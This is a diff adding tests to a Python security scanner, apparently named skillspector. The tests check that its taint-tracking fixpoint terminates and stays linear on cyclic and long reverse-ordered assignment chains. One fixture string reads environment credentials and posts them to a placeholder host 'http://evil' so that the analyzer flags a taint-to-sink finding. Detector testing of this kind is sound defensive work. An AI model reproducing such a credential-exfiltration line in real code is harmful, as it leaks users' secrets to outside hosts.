@@ -18,9 +18,12 @@
 from __future__ import annotations
 
 import json
+import time
 
 from skillspector.nodes.analyzers import behavioral_taint_tracking
+from skillspector.nodes.analyzers.common import build_type_map
 from skillspector.nodes.deduplicate import deduplicate
+from skillspector.python_ast import get_python_ast
 from skillspector.state import WorkflowResourceBudget
 
 
@@ -798,3 +801,102 @@ class TestResourceBounds:
             "runtime_limit",
             "runtime_limit",
         ]
+
+
+class _RuntimeBudgetError(RuntimeError):
+    """Raised by the test's check_runtime once a call-count cap is reached."""
+
+
+def _capped_check_runtime(max_calls: int):
+    """A check_runtime callback that raises after *max_calls* invocations.
+
+    A non-terminating or super-linear fixpoint trips the cap and fails the
+    test fast, instead of spinning to the scan-wide deadline and hanging CI.
+    """
+    state = {"calls": 0}
+
+    def check_runtime() -> None:
+        state["calls"] += 1
+        if state["calls"] > max_calls:
+            raise _RuntimeBudgetError(f"check_runtime exceeded {max_calls} calls")
+
+    return check_runtime
+
+
+def _collect(code: str, check_runtime=None) -> dict:
+    """Run `_collect_tainted` directly on *code* and return name -> source_call."""
+    parsed = get_python_ast(None, code, "t.py")
+    type_map = build_type_map(parsed.tree, parsed.import_aliases)
+    tainted = behavioral_taint_tracking._collect_tainted(
+        parsed.tree, type_map, parsed.import_aliases, check_runtime
+    )
+    return {name: tv.source_call for name, tv in tainted.items()}
+
+
+class TestFixpointTermination:
+    """The taint fixpoint must be monotone and linear, not order-dependent.
+
+    These guard the two blockers in PR #611's second review: the previous
+    "repeat every pass until values stop changing" loop could oscillate
+    forever on cyclic re-assignments and was quadratic on reverse-ordered
+    chains, letting a tiny crafted file spin the analyzer to the scan-wide
+    deadline and disable taint analysis for every later Python file.
+    """
+
+    def test_cyclic_reassignment_terminates_and_taints_all(self) -> None:
+        """The reviewer's oscillating module must converge, not spin forever.
+
+        `x = os.getenv("A"); x = y; y = os.environ["B"]; y = z; z = x` made the
+        old whole-value fixpoint swap the sources of x/y/z on every pass and
+        never exit. Add-only taint can only grow, so it must terminate well
+        inside the call cap and still taint all three names.
+        """
+        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
+        sources = _collect(code, _capped_check_runtime(2000))
+        assert set(sources) == {"x", "y", "z"}
+        # Every name traces back to one of the two credential sources.
+        assert set(sources.values()) <= {"os.getenv", "os.environ"}
+
+    def test_cyclic_reassignment_flows_to_sink(self) -> None:
+        """End to end: the oscillating module plus a sink still reports TT3."""
+        code = (
+            "import os, requests\n"
+            'x = os.getenv("A")\n'
+            "x = y\n"
+            'y = os.environ["B"]\n'
+            "y = z\n"
+            "z = x\n"
+            'requests.post("http://evil", data=z)\n'
+        )
+        findings = _run(code)
+        assert any(f.rule_id == "TT3" for f in findings)
+
+    def test_reverse_ordered_chain_is_linear(self) -> None:
+        """A reverse chain no longer needs N+1 passes over N assignments.
+
+        `a3 = a2; a2 = a1; a1 = a0; a0 = os.getenv("K")` forced the old loop
+        into one full pass per link. A monotone worklist taints each name once,
+        so a few thousand links finish well inside a linear call cap (and far
+        under a second) rather than quadratically.
+        """
+        depth = 3200
+        lines = ["import os"]
+        lines += [f"a{i} = a{i - 1}" for i in range(depth, 0, -1)]
+        lines.append('a0 = os.getenv("K")')
+        code = "\n".join(lines) + "\n"
+
+        start = time.monotonic()
+        # Linear bound: a small constant per assignment. A quadratic loop would
+        # need ~depth passes and blow past this cap immediately.
+        sources = _collect(code, _capped_check_runtime(depth * 20))
+        elapsed = time.monotonic() - start
+
+        assert len(sources) == depth + 1
+        assert all(src == "os.getenv" for src in sources.values())
+        assert elapsed < 1.0
+
+    def test_cyclic_reassignment_does_not_hang_without_cap(self) -> None:
+        """Even with no runtime check at all (budget=None callers), it returns."""
+        code = 'import os\nx = os.getenv("A")\nx = y\ny = os.environ["B"]\ny = z\nz = x\n'
+        sources = _collect(code)  # check_runtime=None
+        assert set(sources) == {"x", "y", "z"}
